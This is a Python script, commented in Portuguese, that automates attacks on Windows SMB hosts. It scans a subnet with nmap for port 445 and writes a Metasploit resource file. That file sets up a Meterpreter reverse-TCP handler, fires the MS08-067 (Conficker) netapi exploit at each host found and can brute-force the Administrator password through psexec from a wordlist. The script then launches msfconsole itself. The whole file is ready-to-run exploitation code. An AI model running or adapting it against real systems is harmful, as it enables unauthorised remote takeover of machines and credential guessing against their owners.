#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import optparse
import nmap


def findTgts(subNet):
    """ Funcao procurar o Samba rodando na porta padrao 445 """

    # Cria um objeto do nmap
    nmScan = nmap.PortScanner()
    # Scaneia no host alvo o servico samba na porta 445
    nmScan.scan(subNet, '445')
    tgtHosts = []
    # Loopa em todos os host encontrados no scaneamento
    for host in nmScan.all_hosts():
        # Se encontrar o servico up na porta 445
        if nmScan[host].has_tcp(445):
            # Verifica o status do servico
            state = nmScan[host]['tcp'][445]['state']
            # Se o servico estiver aberto, encontrou um alvo
            if state == 'open':
                print('[+] Found Target Host: %s' % (host))
                # Armazena quais host tem o samba up com status aberto
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    """ Funcao para setar atributos """

    # Seta os parametros no arquivo de conf
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT %s\n' % (str(lport)))
    configFile.write('set LHOST %s\n' % (lhost))
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    """ Funcao para setar atributos """

    # Seta os parametros no arquivo de conf
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST %s\n' % (str(tgtHost)))
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT %s\n' % (str(lport)))
    configFile.write('set LHOST %s\n' % (lhost))
    configFile.write('exploit -j -z\n')


def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    """ Funcao para setar senhas ao arquivo de conf """

    # Seta um usuario
    username = 'Administrator'
    # Abre o arquivo de senha informado via parametro
    pF = open(passwdFile, 'r')
    # Loopa todas as senhas do arquivo informdo
    for password in pF.readlines():
        # Retira a quebra de linha
        password = password.strip('\n').strip('\r')
        # Seta os parametros no arquivo de conf
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser %s\n' % (str(username)))
        configFile.write('set SMBPass %s\n' % (str(password)))
        configFile.write('set RHOST %s\n' % (str(tgtHost)))
        configFile.write('set payload windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT %s\n' % (str(lport)))
        configFile.write('set LHOST %s\n' % (lhost))
        configFile.write('exploit -j -z\n')


def main():
    # Cria um arquivo temporario para armazenar as configuracoes
    configFile = open('meta.rc', 'w')

    # Parse explicando como deve ser a chamada do script
    parser = optparse.OptionParser('[-] Usage %prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    # Separa os parametros solicitados
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string', help='password file for SMB brute force attempt')

    # Faz o parse dos parametros
    (options, args) = parser.parse_args()

    # Se nao receber os parametros solicitados para o script
    if (not options.tgtHost) | (not options.lhost):
        print(parser.usage)
        exit(0)

    # Separa os parametros em variaveis
    lhost = options.lhost
    lport = options.lport
    # Se nao passar uma porta informa uma padrao
    if not lport:
        lport = '1337'

    # Separa os parametros em variaveis
    passwdFile = options.passwdFile

    # Chama a funcao para procurar um host com samba
    tgtHosts = findTgts(options.tgtHost)

    # Seta informacoes no arquivo de conf
    setupHandler(configFile, lhost, lport)

    # Loopa todos os hosts validos com samba
    for tgtHost in tgtHosts:
        # Seta informacoes no arquivo de conf
        confickerExploit(configFile, tgtHost, lhost, lport)
        # Se informou via parametro um arquivo com senhas
        if passwdFile:
            # Chama a funcao setar senhas ao conf
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)

    configFile.close()
    os.system('msfconsole -r meta.rc')

# Chama a funcao main principal
if __name__ == '__main__':
    main()
